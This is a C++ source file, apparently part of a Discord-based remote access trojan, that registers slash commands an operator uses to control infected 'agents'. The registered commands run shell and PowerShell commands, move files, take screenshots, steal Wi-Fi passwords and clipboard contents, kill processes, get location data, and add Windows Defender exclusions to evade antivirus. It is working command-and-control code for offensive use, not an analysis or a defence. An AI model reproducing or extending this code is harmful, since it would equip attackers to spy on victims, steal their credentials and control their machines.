#include "core/CommandRegister.h"
#include "core/Config.h"
#include "core/InitializationStatus.h"
#include <iostream>

CommandRegister::CommandRegister(HttpClient& httpClient) : httpClient(httpClient) {}

bool CommandRegister::RegisterCommand(const std::unordered_set<int64_t>& agentIds) {
    std::wstring endpoint = L"https://discord.com/api/v10/applications/" + config::cfg.w_appId + L"/commands";
    std::wcout << L"Constructed endpoint: " << endpoint << std::endl;

    std::cout << "Fetched agent IDs: ";
    for (const auto& id : agentIds) {
        std::cout << id << " ";
    }
    std::cout << std::endl;

    json agentChoices = json::array();
    for (const auto& id : agentIds) {
        agentChoices.push_back({
            {"name", "Agent " + std::to_string(id)},
            {"value", std::to_string(id)}
            });
    }

    json commands = json::array();

    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Execute a command on a specific agent"},
        {"dm_permission", false},
        {"name", "runcmd"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The command to execute"}, {"name", "task"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });

    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Execute a command on all agents, with one agent responding"},
        {"dm_permission", false},
        {"name", "runcmd-all"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID to acknowledge the command"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The command to execute on all agents"}, {"name", "task"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });

#ifdef ENABLE_DOWNLOAD
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Download a file from a specific agent"},
        {"dm_permission", false},
        {"name", "download"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The file path to download"}, {"name", "file"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif

#ifdef ENABLE_UPLOAD
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Upload a file to a specific agent"},
        {"dm_permission", false},
        {"name", "upload"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The destination path on the agent"}, {"name", "destination"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif

#ifdef ENABLE_SCREENSHOT
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Take a screenshot on a specific agent"},
        {"dm_permission", false},
        {"name", "screenshot"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_CD_DIR
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Change the current directory on a specific agent"},
        {"dm_permission", false},
        {"name", "cd"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The directory path to change to"}, {"name", "path"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });

    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "List the contents of the current directory on a specific agent"},
        {"dm_permission", false},
        {"name", "dir"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_WIFI
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Retrieve Wi-Fi passwords from a specific agent"},
        {"dm_permission", false},
        {"name", "wifi"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_CLIPBOARD
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Retrieve clipboard contents from a specific agent"},
        {"dm_permission", false},
        {"name", "clipboard"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_APPLICATIONS
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Retrieve list of installed applications from a specific agent"},
        {"dm_permission", false},
        {"name", "applications"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_SYSINFO
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Retrieve system information from a specific agent"},
        {"dm_permission", false},
        {"name", "sysinfo"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_REREGISTER
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Re-register all the commands to update agent list"},
        {"dm_permission", false},
        {"name", "re-register"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_CLEANDEAD
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Clean dead agents from beacon chanel"},
        {"dm_permission", false},
        {"name", "clean-dead"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_PROCESSES
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Retrieve list of running processes from a specific agent"},
        {"dm_permission", false},
        {"name", "ps"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false},
             {"choices", json::array({
                 {{"name", "all"}, {"value", "all"}},
                 {{"name", "apps"}, {"value", "apps"}}
             })},
             {"description", "Filter processes: all or apps only"}, {"name", "options"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_DEFENDER_EXCLUSION
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Add defender exclusion zone"},
        {"dm_permission", false},
        {"name", "defender-exclusion"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The path to exclude from Defender"}, {"name", "path"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_POWERSHELL
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Execute a PowerShell command on a specific agent"},
        {"dm_permission", false},
        {"name", "powershell"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The PowerShell command to execute"}, {"name", "command"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_KILL
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Terminate a specified process on a specific agent"},
        {"dm_permission", false},
        {"name", "kill"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}},
            {{"autocomplete", false}, {"description", "The process name to terminate (e.g., notepad.exe)"}, {"name", "process"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
#ifdef ENABLE_LOCATION
    commands.push_back({
        {"application_id", config::cfg.appId},
        {"default_member_permissions", "8"},
        {"description", "Retrieve location data for a specific agent"},
        {"dm_permission", false},
        {"name", "location"},
        {"nsfw", false},
        {"options", json::array({
            {{"autocomplete", false}, {"choices", agentChoices}, {"description", "The agent ID"}, {"name", "agentid"}, {"required", true}, {"type", 3}}
        })},
        {"type", 1}
        });
#endif
    std::cout << "Bulk Command JSON: " << commands.dump(2) << std::endl;

    const int maxRetries = 5;
    int attempt = 0;
    DWORD statusCode = 0;
    DWORD retryAfter = 5;
    bool success = false;

    g_InitState.Update(70, "Registering Commands...", false);

    while (attempt < maxRetries && !success) {
        std::cout << "Attempt " << (attempt + 1) << " to register commands..." << std::endl;
        success = httpClient.SendRequest(endpoint, commands.dump(), config::cfg.token, "PUT", "application/json", nullptr, &statusCode, &retryAfter);

        if (!success) {
            std::cerr << "Registration attempt " << (attempt + 1) << " failed with status code: " << statusCode << std::endl;
            if (statusCode == 429) {
                attempt++;
                DWORD waitTime = (retryAfter > 0) ? retryAfter : 5;
                std::cout << "Rate limited (429). Retrying after " << waitTime << " seconds..." << std::endl;
                g_InitState.Update(75, "Rate Limited - Retrying Cmd Reg...", false);
                std::this_thread::sleep_for(std::chrono::seconds(waitTime));
            }
            else {
                std::cerr << "Unrecoverable error during command registration." << std::endl;
                g_InitState.Update(80, "Cmd Reg Failed - Error", true);
                break;
            }
        }
    }

    if (success) {
        std::cout << "Successfully registered commands with Discord API." << std::endl;
        g_InitState.Update(100, "Online", true);
    }
    else {
        std::cerr << "Failed to register commands after " << maxRetries << " attempts." << std::endl;
        if (statusCode != 429) {
            g_InitState.Update(80, "Cmd Reg Failed - Max Retries", true);
        }
    }
    return success;
}